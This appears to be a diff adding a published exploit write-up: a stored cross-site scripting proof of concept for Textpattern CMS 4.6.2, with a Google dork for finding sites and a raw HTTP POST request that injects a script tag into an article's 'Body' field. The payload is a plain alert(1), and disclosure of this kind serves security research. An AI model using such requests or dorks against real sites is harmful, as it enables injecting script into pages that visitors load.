@@ -1,0 +1,51 @@
+# Exploit Title: Textpattern CMS 4.6.2 - 'body' Persistent Cross-Site Scripting
+# Exploit Author: Alperen Ergel
+# Web Site: https://alperenae.gitbook.io/
+# Software Homepage: https://textpattern.com/
+# Version : 4.6.2
+# Tested on: windows 10 / xammp
+# Category: WebApp
+# Google Dork: intext:"Published with Textpattern CMS"
+# Date: 2020-10-29
+# CVE :-
+######## Description ########
+#
+# 1-) Loggin administrator page
+# 
+# 2-) Write new blog add payload to 'body'
+#
+# 3-) Back to web site then will be work payload
+#
+#
+######## Proof of Concept ########
+
+========>>> REQUEST <<<=========
+
+POST /textpattern/textpattern/index.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://localhost/textpattern/textpattern/index.php?event=article&ID=3
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------127132438115577379281797109093
+Content-Length: 6080
+Connection: close
+Cookie: txp_login=localhost%2Ca170e235c4f2f59bb1300272c470807d; txp_login_public=a834cbdc8blocalhost; __atuvc=1%7C40; __atuvs=5f77129c504c17ce000
+
+### SNIPPP HERE ####
+
+-----------------------------127132438115577379281797109093
+Content-Disposition: form-data; name="Title"
+
+XSS
+-----------------------------127132438115577379281797109093
+Content-Disposition: form-data; name="textile_body"
+
+1
+-----------------------------127132438115577379281797109093
+Content-Disposition: form-data; name="Body"
+
+<script>alert(1)</script>
+-----------------------------127132438115577379281797109093
